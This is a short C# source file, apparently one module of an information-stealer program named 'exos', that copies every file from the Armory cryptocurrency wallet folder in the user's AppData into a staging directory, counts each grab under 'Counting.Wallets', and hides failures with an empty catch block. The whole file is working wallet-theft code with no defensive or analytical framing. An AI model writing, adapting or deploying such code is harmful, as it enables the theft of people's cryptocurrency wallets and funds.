using System.IO;

namespace exos;

internal class Armory
{
	public static int count = 0;

	private static readonly string ArmoryDir = "\\Wallets\\Armory\\";

	public static void ArmoryStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\Armory\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + ArmoryDir);
				fileInfo.CopyTo(directorypath + ArmoryDir + fileInfo.Name);
			}
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
